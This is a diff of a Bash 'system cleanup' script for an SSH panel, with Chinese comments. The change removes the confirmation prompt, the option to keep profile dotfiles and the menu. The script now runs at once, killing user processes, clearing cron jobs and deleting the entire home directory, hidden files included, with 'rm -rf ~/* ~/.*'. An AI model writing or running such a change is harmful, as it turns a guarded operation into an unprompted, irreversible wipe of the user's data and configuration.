@@ -34,59 +34,17 @@ killUserProc() {
 
 # 系统初始化函数
 initServer() {
-    read -p "$(red "确定要初始化系统吗？这将删除大部分数据。 [y/n] [n]: ")" input
-    input=${input:-n}
-    
-    if [[ "$input" == "y" ]] || [[ "$input" == "Y" ]]; then
-        read -p "是否保留用户配置？[y/n] [y]: " saveProfile
-        saveProfile=${saveProfile:-y}
+    green "清理cron任务..."
+    cleanCron
 
-        green "清理cron任务..."
-        cleanCron
+    green "清理用户进程..."
+    killUserProc
 
-        green "清理用户进程..."
-        killUserProc
+    green "清理磁盘..."
+    rm -rf ~/* ~/.* 2>/dev/null
 
-        green "清理磁盘..."
-        if [[ "$saveProfile" = "y" ]] || [[ "$saveProfile" = "Y" ]]; then
-            rm -rf ~/* 2>/dev/null
-        else
-            rm -rf ~/* ~/.* 2>/dev/null
-        fi
-
-        yellow "系统初始化完成"
-    else
-        yellow "操作已取消"
-    fi
+    yellow "系统初始化完成"
 }
 
-# 显示菜单
-showMenu() {
-    clear
-    echo "========================================="
-    echo "         系统清理脚本 - SSH面板          "
-    echo "========================================="
-    echo "1. 初始化系统（清理数据）"
-    echo "2. 退出"
-    echo "========================================="
-    read -p "请选择操作 [1-2]: " choice
-
-    case $choice in
-        1)
-            initServer
-            ;;
-        2)
-            echo "退出脚本"
-            exit 0
-            ;;
-        *)
-            red "无效的选择，请重新输入"
-            ;;
-    esac
-}
-
-# 主循环
-while true; do
-    showMenu
-    read -p "按Enter键继续..."
-done
+# 直接执行系统初始化
+initServer
